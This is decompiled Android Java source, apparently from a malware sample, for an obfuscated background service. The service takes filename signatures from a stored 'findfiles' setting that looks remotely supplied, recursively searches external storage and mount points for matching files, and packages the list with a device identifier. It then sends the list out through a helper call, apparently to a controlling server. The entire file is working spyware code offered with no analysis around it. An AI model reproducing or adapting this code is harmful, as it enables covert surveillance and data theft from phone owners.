package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import java.io.File;

public class mvqkjokaxfrpf extends IntentService {

    /* renamed from: a */
    C0034b f441a = new C0034b();

    /* renamed from: b */
    String f442b = "";

    /* renamed from: c */
    String[] f443c;

    public mvqkjokaxfrpf() {
        super("mvqkjokaxfrpf");
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo293a(File file) {
        File[] listFiles;
        try {
            System.out.println(file);
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    mo294b(file2);
                } else if (file2.isFile()) {
                    for (String str : this.f443c) {
                        if (str.length() > 1 && file2.getName().contains(str)) {
                            StringBuilder sb = new StringBuilder();
                            sb.append(this.f442b);
                            sb.append("|*|");
                            sb.append(file2.getAbsolutePath());
                            sb.append("\n");
                            this.f442b = sb.toString();
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* access modifiers changed from: 0000 */
    /* renamed from: b */
    public void mo294b(File file) {
        File[] listFiles;
        for (File file2 : file.listFiles()) {
            if (file2.isDirectory()) {
                mo294b(file2);
            } else if (file2.isFile()) {
                for (String str : this.f443c) {
                    if (str.length() > 1 && file2.getName().contains(str)) {
                        StringBuilder sb = new StringBuilder();
                        sb.append(this.f442b);
                        sb.append("|*|");
                        sb.append(file2.getAbsolutePath());
                        sb.append("\n");
                        this.f442b = sb.toString();
                    }
                }
            }
        }
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        try {
            String e = this.f441a.mo234e(this, "findfiles");
            if (e.contains("/")) {
                this.f443c = e.split("/");
            } else {
                this.f443c[0] = e;
            }
            File file = new File("/mnt");
            File file2 = new File("/mount");
            File file3 = new File("/sdcard");
            File file4 = new File("/storage");
            File file5 = new File("/Removable");
            mo293a(Environment.getExternalStorageDirectory());
            mo293a(file);
            mo293a(file2);
            mo293a(file3);
            mo293a(file4);
            mo293a(file5);
            String replace = this.f442b.replace("|*|", "");
            if (replace.length() > 10) {
                StringBuilder sb = new StringBuilder();
                sb.append("Found files by signatures:\n");
                sb.append(replace);
                String sb2 = sb.toString();
                StringBuilder sb3 = new StringBuilder();
                sb3.append("p=");
                C0034b bVar = this.f441a;
                StringBuilder sb4 = new StringBuilder();
                sb4.append(this.f441a.mo247q(this));
                sb4.append("|");
                sb4.append(sb2);
                sb4.append("|");
                sb3.append(bVar.mo225c(sb4.toString()));
                this.f441a.mo218b(this, "4", sb3.toString());
            }
            this.f441a.mo233d(this, "findfiles", "**false**");
        } catch (Exception unused) {
        }
    }
}
